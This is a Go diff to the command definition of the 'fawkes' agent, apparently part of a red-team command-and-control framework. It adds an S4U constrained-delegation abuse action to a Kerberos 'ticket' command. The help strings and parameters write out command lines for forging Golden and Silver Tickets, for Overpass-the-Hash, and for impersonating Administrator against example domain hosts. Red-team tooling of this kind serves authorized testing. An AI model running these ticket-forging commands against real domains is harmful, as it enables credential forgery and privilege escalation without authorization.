@@ -10,11 +10,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ticket",
-		Description:         "Forge or request Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). Outputs kirbi or ccache format.",
-		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_key> -key_type rc4 -format ccache\nticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <hex_key> -spn MSSQLSvc/db01.corp.local:1433\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local",
+		Description:         "Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Outputs kirbi or ccache format.",
+		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_key> -key_type rc4 -format ccache\nticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <hex_key> -spn MSSQLSvc/db01.corp.local:1433\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002"},
+		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1134.001"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -27,9 +27,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash AS exchange with KDC)",
+				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash AS exchange with KDC), s4u (constrained delegation abuse via S4U2Self+S4U2Proxy)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"forge", "request"},
+				Choices:          []string{"forge", "request", "s4u"},
 				DefaultValue:     "forge",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -50,7 +50,7 @@ func init() {
 				Name:             "username",
 				CLIName:          "username",
 				ModalDisplayName: "Username",
-				Description:      "Username for the forged ticket (e.g., Administrator)",
+				Description:      "Username for the ticket. Forge/request: target identity. S4U: service account with delegation rights.",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -138,7 +138,7 @@ func init() {
 				Name:             "spn",
 				CLIName:          "spn",
 				ModalDisplayName: "SPN (Silver Ticket)",
-				Description:      "Service Principal Name for Silver Ticket (e.g., cifs/dc01.corp.local). Omit for Golden Ticket.",
+				Description:      "Service Principal Name. Forge: Silver Ticket target (omit for Golden). S4U: target service for S4U2Proxy (e.g., cifs/dc01.corp.local).",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -149,7 +149,18 @@ func init() {
 				Name:             "server",
 				CLIName:          "server",
 				ModalDisplayName: "KDC Server",
-				Description:      "KDC/Domain Controller address for request action (e.g., dc01.corp.local or 192.168.1.10)",
+				Description:      "KDC/Domain Controller address for request/s4u action (e.g., dc01.corp.local or 192.168.1.10)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "impersonate",
+				CLIName:          "impersonate",
+				ModalDisplayName: "Impersonate User",
+				Description:      "S4U: user to impersonate via constrained delegation (e.g., Administrator). Only used with s4u action.",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -177,12 +188,17 @@ func init() {
 			username, _ := taskData.Args.GetStringArg("username")
 			spn, _ := taskData.Args.GetStringArg("spn")
 			server, _ := taskData.Args.GetStringArg("server")
+			impersonate, _ := taskData.Args.GetStringArg("impersonate")
 
 			var displayMsg, artifactMsg string
-			if action == "request" {
+			switch action {
+			case "request":
 				displayMsg = fmt.Sprintf("Overpass-the-Hash: %s@%s via %s", username, realm, server)
 				artifactMsg = fmt.Sprintf("Kerberos AS-REQ (Overpass-the-Hash) for %s@%s to %s", username, realm, server)
-			} else {
+			case "s4u":
+				displayMsg = fmt.Sprintf("S4U delegation: %s → %s for %s via %s", username, impersonate, spn, server)
+				artifactMsg = fmt.Sprintf("Kerberos S4U2Self+S4U2Proxy: %s impersonating %s for %s to %s", username, impersonate, spn, server)
+			default:
 				var ticketType string
 				if spn == "" {
 					ticketType = "Golden Ticket (TGT)"
